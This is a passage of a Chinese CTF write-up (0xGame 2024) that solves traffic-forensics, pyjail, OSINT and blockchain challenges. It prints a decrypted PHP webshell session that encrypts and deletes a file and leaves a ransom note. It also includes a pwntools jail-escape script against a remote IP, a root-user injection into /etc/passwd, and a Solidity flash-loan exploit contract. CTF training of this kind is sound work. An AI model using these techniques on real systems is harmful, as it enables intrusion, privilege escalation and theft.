invoke__">base64_encode</span>(<span class="string">&quot;none of proc_open/passthru/shell_exec/exec/exec is available&quot;</span>);</span><br><span class="line">        <span class="variable">$key</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">encrypt</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$result</span>));</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$result</span>[<span class="string">&quot;status&quot;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">    <span class="variable">$result</span>[<span class="string">&quot;msg&quot;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">getSafeStr</span>(<span class="variable">$kWJW</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">encrypt</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$result</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Encrypt</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$key</span>=<span class="string">&quot;e45e329feb5d925b&quot;</span>; </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$data</span>[<span class="variable">$i</span>] = <span class="variable">$data</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>]; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$bs</span>=<span class="string">&quot;base64_&quot;</span>.<span class="string">&quot;encode&quot;</span>;</span><br><span class="line">    <span class="variable">$after</span>=<span class="variable">$bs</span>(<span class="variable">$data</span>.<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$after</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cmd</span>=<span class="string">&quot;Y2QgL2QgIkQ6XEFBQUNURlxXRUJccGhwU3R1ZHlfNjRccGhwc3R1ZHlfcHJvXFdXV1x1cGxvYWRcIiZkaXI=&quot;</span>;<span class="variable">$cmd</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$cmd</span>);<span class="variable">$path</span>=<span class="string">&quot;RDovQUFBQ1RGL1dFQi9waHBTdHVkeV82NC9waHBzdHVkeV9wcm8vV1dXL3VwbG9hZC8=&quot;</span>;<span class="variable">$path</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$path</span>);</span><br><span class="line"><span class="title function_ invoke__">main</span>(<span class="variable">$cmd</span>,<span class="variable">$path</span>);</span><br></pre></td></tr></table></figure><p>可以看到主要的操作是先将<code>$cmd</code>和<code>$path</code>进行<code>base64_decode</code>，之后执行并返回 先<code>json_encode</code>后<code>Encrypt</code>的<code>$result</code>，<code>$result</code>中有两个信息，<code>base64_encode</code>后的<code>status</code>和<code>msg</code>，其中<code>msg</code>是执行系统命令后的回显结果。于是可以先分析出第三段进行的操作：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /d <span class="string">&quot;D:\AAACTF\WEB\phpStudy_64\phpstudy_pro\WWW\upload\&quot;&amp;dir</span></span><br></pre></td></tr></table></figure><p>结合流量的响应包可以分析出上述操作后的结果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Decrypt</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$key</span>=<span class="string">&quot;e45e329feb5d925b&quot;</span>; </span><br><span class="line">    <span class="variable">$bs</span>=<span class="string">&quot;base64_&quot;</span>.<span class="string">&quot;decode&quot;</span>;</span><br><span class="line">    <span class="variable">$after</span>=<span class="variable">$bs</span>(<span class="variable">$data</span>.<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$after</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$after</span>[<span class="variable">$i</span>] = <span class="variable">$after</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>]; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$after</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$shell</span> = <span class="string">&quot;TxcWR1NNExZAD0ZaAWMIPAZjH1BFBFtHThcJSlUXWEd9eghDQVwxLhN6M2NDdiAgfXo2B0BcAwQKejN3Rh4DPEZMIV5eSyIJC0QgVVhXASt3XCFfWFsACw9aMFVHWj5KWFwvVV5TUQMPWC8BVXs2PEx6NgMCdDMsVnE1Vnx2CydxeglLcGgzIyZjIWNRY1Izd20tcV1aICtSUTNrB20YPARtLXFdWi4rUlEzawdtUSdNV1RLam9XAQFRPHtBV1AjX3wqVlNRKQAARxFuC1kzVX9xNFxLdCIsUnkeeAd5GCAHfCZyS3QyChp4J3hVfCEkDGcgX2FpDyQFfCd4VXwhJFN8JnJHfTcKG3ggcAJ5GCQBeR92AXAlJBt4MFZFeiEkU3wmcgprIwkxZQ14VXwhJFN8JnJVcCUkF3kDCXl4CCRNeyYLRXY1XRp7HXhVeAggAngxclVwJSQFfCd4VXwhJFN8JnJVcCUkGHggWlVWUA1YVyJER1ohDRVxNVZVfCEkU3wmclVwJSQFfCd4VXwhJEx8KmAGSBMENV1PagVBCyRTfCZyVXAlJAV8J3hVfCYoQ3scd15LPAMNXAtwfHYLJFN8JnJVcCUkBXwneFV8ISRTfCF6VQwqDBMAUUxHAABXYnwhegJ3HxIbex5SQXsIDk55IVRLdyUhDl9SZR1bDi5eWRdpVFYPCit7J14PCEAY&quot;</span>;</span><br><span class="line"><span class="variable">$d</span> = <span class="title function_ invoke__">Decrypt</span>(<span class="variable">$shell</span>);</span><br><span class="line"><span class="keyword">print</span>(<span class="variable">$d</span>);</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;status&quot;:&quot;c3VjY2Vzcw==&quot;,&quot;msg&quot;:&quot;IOmpseWKqOWZqCBEIOS4reeahOWNt+aYryDmlrDliqDljbcNCiDljbfnmoTluo\/liJflj7fmmK8gNTYxOS00MUI4DQoNCiBEOlxBQUFDVEZcV0VCXHBocFN0dWR5XzY0XHBocHN0dWR5X3Byb1xXV1dcdXBsb2FkIOeahOebruW9lQ0KDQoyMDI0LzA5LzE3ICAyMToxMCAgICA8RElSPiAgICAgICAgICAuDQoyMDI0LzA5LzE3ICAyMTowOCAgICA8RElSPiAgICAgICAgICAuLg0KMjAyNC8wOS8xNyAgMjE6MTAgICAgICAgICAgICAgICAzMDcgc2hlbGwucGhwDQogICAgICAgICAgICAgICAxIOS4quaWh+S7tiAgICAgICAgICAgIDMwNyDlrZfoioINCiAgICAgICAgICAgICAgIDIg5Liq55uu5b2VIDI0NywyNzksNjkzLDgyNCDlj6\/nlKjlrZfoioINCg==&quot;&#125;</span><br></pre></td></tr></table></figure><p>进行base64解码可以得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">status:success</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msg:</span><br><span class="line"> 驱动器 D 中的卷是 新加卷</span><br><span class="line"> 卷的序列号是 5619-41B8</span><br><span class="line"></span><br><span class="line"> D:\AAACTF\WEB\phpStudy_64\phpstudy_pro\WWW\upload 的目录</span><br><span class="line"></span><br><span class="line">2024/09/17  21:10    &lt;DIR&gt;          .</span><br><span class="line">2024/09/17  21:08    &lt;DIR&gt;          ..</span><br><span class="line">2024/09/17  21:10               307 shell.php</span><br><span class="line">               1 个文件            307 字节</span><br><span class="line">               2 个目录 247,279,693,824 可用字节</span><br></pre></td></tr></table></figure><p>之后一段段分析即可，整段攻击过程如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /d <span class="string">&quot;D:\AAACTF\WEB\phpStudy_64\phpstudy_pro\WWW\upload\&quot;&amp;dir</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> 驱动器 D 中的卷是 新加卷</span></span><br><span class="line"><span class="string"> 卷的序列号是 5619-41B8</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> D:\AAACTF\WEB\phpStudy_64\phpstudy_pro\WWW\upload 的目录</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">2024/09/17  21:10    &lt;DIR&gt;          .</span></span><br><span class="line"><span class="string">2024/09/17  21:08    &lt;DIR&gt;          ..</span></span><br><span class="line"><span class="string">2024/09/17  21:10               307 shell.php</span></span><br><span class="line"><span class="string">               1 个文件            307 字节</span></span><br><span class="line"><span class="string">               2 个目录 247,279,693,824 可用字节</span></span><br><span class="line"><span class="string">               </span></span><br><span class="line"><span class="string">               </span></span><br><span class="line"><span class="string">cd /d &quot;</span>D:\AAACTF\WEB\phpStudy_64\phpstudy_pro\WWW\upload\&quot;&amp;<span class="built_in">cd</span> ../</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /d <span class="string">&quot;D:\AAACTF\WEB\phpStudy_64\phpstudy_pro\WWW\upload\..\&quot;&amp;dir</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> 驱动器 D 中的卷是 新加卷</span></span><br><span class="line"><span class="string"> 卷的序列号是 5619-41B8</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> D:\AAACTF\WEB\phpStudy_64\phpstudy_pro\WWW 的目录</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">2024/09/17  21:08    &lt;DIR&gt;          .</span></span><br><span class="line"><span class="string">2024/09/07  18:30    &lt;DIR&gt;          ..</span></span><br><span class="line"><span class="string">2024/09/16  23:22               332 index.html</span></span><br><span class="line"><span class="string">2024/09/17  20:21                75 unfinished_hello.php</span></span><br><span class="line"><span class="string">2024/09/17  21:10    &lt;DIR&gt;          upload</span></span><br><span class="line"><span class="string">2024/09/17  11:07             1,202 upload.php</span></span><br><span class="line"><span class="string">               3 个文件          1,609 字节</span></span><br><span class="line"><span class="string">               3 个目录 247,279,693,824 可用字节</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">cd /d &quot;</span>D:\AAACTF\WEB\phpStudy_64\phpstudy_pro\WWW\upload\..\&quot;&amp;openssl version</span><br><span class="line"></span><br><span class="line">WARNING: can<span class="string">&#x27;t open config file: /usr/local/ssl/openssl.cnf</span></span><br><span class="line"><span class="string">OpenSSL 1.0.2p  14 Aug 2018</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">cd /d &quot;D:\AAACTF\WEB\phpStudy_64\phpstudy_pro\WWW\upload\..\&quot;&amp;openssl enc -aes-128-cbc -in unfinished_hello.php -out secret.php -iv 114514 -K c4d038b4bed09fdb</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">WARNING: can&#x27;</span>t open config file: /usr/local/ssl/openssl.cnf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /d <span class="string">&quot;D:\AAACTF\WEB\phpStudy_64\phpstudy_pro\WWW\upload\..\&quot;&amp;del unfinished_hello.php</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">cd /d &quot;</span>D:\AAACTF\WEB\phpStudy_64\phpstudy_pro\WWW\upload\..\&quot;&amp;<span class="built_in">echo</span> <span class="string">&quot;If you want to decrypt your file, give me a copy of your calculus homework. UwU&quot;</span> &gt; readme.txt</span><br></pre></td></tr></table></figure><p>可以看到是用<code>openssl</code>对<code>unfinished_hello.php</code>进行了文件加密，且删掉了原文件，只需要用<code>openssl</code>解<code>secret.php</code>即可拿到原文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl aes-128-cbc -d -<span class="keyword">in</span> secret.php -out flag.php -iv 114514 -K c4d038b4bed09fdb</span><br></pre></td></tr></table></figure><p>输出的<code>flag.php</code>文件内容为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//0xGame&#123;8552BB81-D51A-FDCE-2EF1-55EBBEFF9B9C&#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Hello, </span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="Untouchable-flag"><a href="#Untouchable-flag" class="headerlink" title="Untouchable flag"></a>Untouchable flag</h3><p>题目附件为<code>pyjail.py</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pyjail</span>():</span><br><span class="line">    pattern = re.<span class="built_in">compile</span>(<span class="string">&quot;[a-zA-Z0-9]&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        code = <span class="built_in">input</span>(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> re.findall(pattern,code):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Some characters in your code are banned.&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">len</span>(code) &gt; <span class="number">12</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Your code is too long.&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">eval</span>(code)</span><br></pre></td></tr></table></figure><p>可以看到禁用了所有字母和数字，并且对代码长度有所限制，必须不大于12</p><p>nc连上后题目还给了一个hint:<code>the Python version is greater than 3.7.</code>，网上找找可以知道python3支持非ASCII字符，可以用unicode字符绕过第一个限制，并且还可以找到从Python 3.7开始引入了breakpoint()函数，于是可以绕过第二个限制进行rce：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;47.98.178.117&quot;</span>, <span class="number">2222</span>)</span><br><span class="line"></span><br><span class="line">code = <span class="string">&quot;𝘣𝘳𝘦𝘢𝘬𝘱𝘰𝘪𝘯𝘵()&quot;</span></span><br><span class="line">p.sendline(code)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>拿到shell后直接读flag发现不行，<code>ls- l</code>查看文件权限可以看到flag文件只有root可读，需要寻找提权的方法</p><p>预期解是&#x2F;etc&#x2F;passwd提权，可以看到环境中该文件所有用户可读可写，直接写入一个拥有root权限的用户即可</p><p>办法有很多，这里拿openssl举例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 -salt <span class="built_in">test</span> z9nn8w</span><br><span class="line"></span><br><span class="line">$1$<span class="built_in">test</span><span class="variable">$eicwC</span>/tivElau/ii72ooo0</span><br></pre></td></tr></table></figure><p>写入&#x2F;etc&#x2F;passwd再切换用户即可拿到root权限：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;w8nn9z:$1$test$eicwC/tivElau/ii72ooo0:0:0:root:/root:/bin/bash&#x27;</span> &gt;&gt; /etc/passwd</span><br><span class="line"></span><br><span class="line">su w8nn9z</span><br><span class="line">z9nn8w</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> flag</span><br><span class="line">0xGame&#123;PyJ@i1_w1Th_P@sswd_3l3Vat3_pr1v1l3g3&#125;</span><br></pre></td></tr></table></figure><h2 id="OSINT"><a href="#OSINT" class="headerlink" title="OSINT"></a>OSINT</h2><h3 id="互联网的一角"><a href="#互联网的一角" class="headerlink" title="互联网的一角*"></a>互联网的一角*</h3><p>访问题目页面，摁F12就可以看到前端有注释</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1729496038143-772e7f75-6c33-4116-b94c-c0d36f545137.png" alt="img"></p><p>这里的注释指的是要求查询CNAME记录，后面上的hint中也给出了。查询CNAME记录的方法其实有很多，ping、nslookup、dig等等都可以，最简单的就是这里直接ping一下。</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1729496038235-4d8653c5-31da-4d1b-b764-63526956deee.png" alt="img"></p><p>对于.github.io，如果有经验的话一眼就知道这是github pages。如果不知道，查找一下也很快能得知，这是github上一个叫做oxg4me2024的用户搭建的页面，去github上搜索一下这个用户。</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1729496038235-e0196d4a-c59c-41ed-89c5-415f4634b550.png" alt="img"></p><p>一路顺藤摸瓜找进去，可以找到flag.txt</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1729496038439-fc672b55-e3f9-4f20-a427-05f89a278b93.png" alt="img"></p><p>但是flag.txt的内容并不是flag，这里点击右上角的History，查询这个文件的修改历史即可看到flag</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1729496038352-7848d4ed-657a-46b7-8544-ab7f3a4ebc78.png" alt="img"></p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1729496039022-84e0b736-aacc-4478-909c-cd8575d148cd.png" alt="img"></p><h3 id="给我干哪来了，这还是国内吗？？"><a href="#给我干哪来了，这还是国内吗？？" class="headerlink" title="给我干哪来了，这还是国内吗？？*"></a>给我干哪来了，这还是国内吗？？*</h3><p>图寻题，就是要求找出图片中的地方</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1729496039163-3beb9aaf-8f2c-4881-8918-7fd3ffcc6d97.png" alt="img"></p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1729496039211-e2bccf95-0314-4cb1-b842-84e86119462c.png" alt="img"></p><p>其实不难看出来，底下还有个google的logo没能删掉，这个地方其实可以在google map上找到原图。将图片放大，可以看到远处建筑物上标着的super st bernard，在google map上一搜就有。位置差不多在45.90°N，7.19°E左右。</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1729496039439-56cf623b-ea8f-459a-adbd-6090d85977c9.png" alt="img"></p><p>可以查看实景</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1729496039766-63e8739d-7f7e-4818-bee6-5277f8aada3c.png" alt="img"></p><p>国家是瑞士不用多说，剩下的可以在<a href="https://zh.wikipedia.org/wiki/%E7%91%9E%E5%A3%AB%E5%9F%8E%E5%B8%82%E5%88%97%E8%A1%A8">维基百科</a>上找到，改成英文即可</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1729496039879-b9b181ee-f9e0-4f73-90cf-101503a7bfa5.png" alt="img"></p><p>0xGame{Switzerland_Valais_Entremont_Bourg-Saint-Pierre}</p><h2 id="Blockchain"><a href="#Blockchain" class="headerlink" title="Blockchain"></a>Blockchain</h2><h3 id="肘，上链！"><a href="#肘，上链！" class="headerlink" title="肘，上链！*"></a>肘，上链！*</h3><p>出题时用的是github上的<a href="https://github.com/chainflag/solidity-ctf-template/tree/401c6c470acdeada5eb64ba5bc258a85c503f43c">solidctf</a>项目，所以nc那边传完一次就断就不要拷打我了o(╥﹏╥)o</p><p>先nc创建账户</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1728912624735-18388018-e88f-4cdc-abc2-5a937e74ee03.png" alt="img"></p><p>拿给的账号去水龙头上接一下水</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1728912625208-5fe4b9dc-a87c-472a-958c-84f7af5c0d25.png" alt="img"></p><p>部署题目合约</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1728912625378-4cda8e9b-65b0-4bcd-b269-2c7305d4f617.png" alt="img"></p><p>打开metamask（一个浏览器插件），如下图连接到RPC，其中链ID随便填一个它就会告诉你正确的链ID</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1728912625196-76cd899a-2417-4c10-8b2f-2a5066ee6f09.png" alt="img"></p><p>切换到该网络，拿自己的账户也去水龙头上接一下水</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1728912625278-21646646-c154-4558-8aff-55a3795288a1.png" alt="img"></p><p>获取一下题目合约</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1728912625381-4745037b-e25c-4ca7-9fe6-4b0de94d873e.png" alt="img"></p><p>打开<a href="https://remix.ethereum.org/">remix</a>，这里新建一个文件，把题目合约复制过去</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1728912627380-67d425d2-0b89-41c0-9555-c662c9e0df00.png" alt="img"></p><p>选择相应的版本，编译合约</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1728912627784-9dbc9b55-908e-4383-bdb0-046067fba524.png" alt="img"></p><p>Environment中选择Injected Provider - MetaMask，注意metamask的小窗口要点开看一下是否连接成功</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1728912627408-f4fa0a7d-65bc-4daf-8b43-606569e700a4.png" alt="img"></p><p>将前面nc时给的合约地址复制过来到At Address里面，点击At Address</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1728912627406-e6f814b4-2dc5-410f-9c34-a9b471e119d5.png" alt="img"></p><p>题目的合约代码很简单，要求传的值需要与”Hello0xBlockchain”的keccak256哈希值相同，这里用web3py计算一下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from web3 import Web3</span><br><span class="line">s=b&quot;Hello0xBlockchain&quot;</span><br><span class="line">w3 = Web3()</span><br><span class="line">hash_bytes = w3.keccak(s)</span><br><span class="line">hash_hex = hash_bytes.hex()</span><br><span class="line">print(hash_hex)</span><br></pre></td></tr></table></figure><p>得到的结果复制到sign里面，前面记得加上0x，然后点击sign，中间有个交易的对话框，确认一下</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1728912627608-ae23158a-a906-4dcb-b3ad-8572b828b37b.png" alt="img"></p><p>点击isSolved，看到值已经返回了true</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1728912628021-d06a3d0f-311b-44e8-a3a1-b9d22c7e8a4f.png" alt="img"></p><p>回到nc那边，get flag</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1728912628025-45d879a5-0f85-4af1-ba10-6b13b11577a3.png" alt="img"></p><h3 id="theft"><a href="#theft" class="headerlink" title="theft"></a>theft</h3><p>通过在execute中执行deposit，来替代还款，从而可以达到借了就还但是自己的余额越来越多</p><p>Exp:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface FlashLoan &#123;</span><br><span class="line">    function deposit() external payable;</span><br><span class="line">    function withdraw() external;</span><br><span class="line">    function flashLoan(uint256 amount) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Exp &#123;</span><br><span class="line">    FlashLoan public FL;</span><br><span class="line"></span><br><span class="line">    constructor(address _addr) &#123;</span><br><span class="line">        FL = FlashLoan(_addr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() external &#123;</span><br><span class="line">        for(int i = 0; i &lt; 9; i++)&#123;</span><br><span class="line">            FL.flashLoan(100 ether);</span><br><span class="line">        &#125;</span><br><span class="line">        FL.flashLoan(99 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function execute() external payable &#123;</span><br><span class="line">        FL.deposit&#123;value: msg.value&#125;();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先at address部署Setup.sol获取target地址，然后填入构造函数部署再调用attack即可</p><h3 id="我哪来那么多臭钱？？"><a href="#我哪来那么多臭钱？？" class="headerlink" title="我哪来那么多臭钱？？*"></a>我哪来那么多臭钱？？*</h3><p>具体的部署等操作这里就不再赘述了，详见week1的wp。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.7.0;</span><br><span class="line"></span><br><span class="line">contract Challenge &#123;</span><br><span class="line">    mapping(address =&gt; uint256) public balance;</span><br><span class="line">    bool public solve;</span><br><span class="line">    constructor() &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function Get() public &#123;</span><br><span class="line">        balance[msg.sender] = 50;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function Transfer(address to, uint256 amount) public &#123;</span><br><span class="line">        require(amount &gt; 0, &quot;Man!&quot;);</span><br><span class="line">        require(balance[msg.sender] &gt; 0, &quot;What can I say&quot;);</span><br><span class="line">        require(balance[msg.sender] - amount &gt; 0, &quot;Mamba out!&quot;);</span><br><span class="line">        require(uint160(msg.sender) % (16*16) == 239, &quot;Sometimes I ask myself, who am i?&quot;);</span><br><span class="line">        balance[msg.sender] -= 